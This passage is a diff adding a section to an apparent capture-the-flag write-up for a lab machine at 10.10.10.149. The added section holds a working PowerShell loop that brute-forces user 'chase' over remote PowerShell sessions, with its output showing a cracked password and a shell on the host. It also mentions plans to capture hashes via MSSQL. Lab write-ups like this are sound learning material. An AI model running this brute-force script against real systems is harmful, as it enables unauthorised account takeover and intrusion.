@@ -1469,3 +1469,28 @@ db_denydatawriter    DATABASE_ROLE
 ```
 
 We Enumerated mssql client user and we see that we don't have any important role but in exploit we will try to capture the hash and tryng to avance inside the system
+
+***
+
+## USER BRUTE FORCE WITH POWERSHELL
+
+```
+PS /opt/heist> foreach($pass in cat ./passwords) {  
+>>     $user = "chase"
+>>     $secstr = New-Object -TypeName System.Security.SecureString
+>>     $pass.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
+>>     $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $user, $secstr
+>>     $res = New-PSSession -ComputerName 10.10.10.149 -Authentication Negotiate -Credential $cred -ErrorAction SilentlyContinue
+>>     if($res -ne $null) {
+>>         echo "[+] Found password: $pass"
+>>         Enter-PSSession $res
+>>     } else {
+>>         echo "[-] Password failed: $pass"
+>>     }
+>> }
+[-] Password failed: stealth1agent
+[-] Password failed: $uperP@ssword
+[+] Found password: Q4)sJu\Y8qz*A3?d
+[10.10.10.149]: PS C:\Users\Chase\Documents> whoami
+supportdesk\chase
+```
